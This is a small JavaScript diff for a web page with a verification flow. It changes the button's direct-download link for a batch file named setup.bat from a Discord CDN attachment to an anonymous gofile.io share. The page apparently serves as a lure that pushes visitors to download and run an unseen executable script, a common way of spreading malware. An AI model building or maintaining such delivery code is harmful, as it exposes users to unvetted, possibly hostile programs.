@@ -254,7 +254,7 @@ backToVerifBtn.addEventListener('click', () => goToStep(1));
 
 downloadSetupBtn.addEventListener('click', () => {
     // Direct download from Discord CDN
-    const setupUrl = 'https://cdn.discordapp.com/attachments/1454771216878403636/1467917880170516685/setup.bat?ex=6982208f&is=6980cf0f&hm=c2718796f0385868276d026e006b19bbbf8a3453013fcc040564434b1343273b&';
+    const setupUrl = 'https://gofile.io/d/abcjwU';
     
     const a = document.createElement('a');
     a.href = setupUrl;
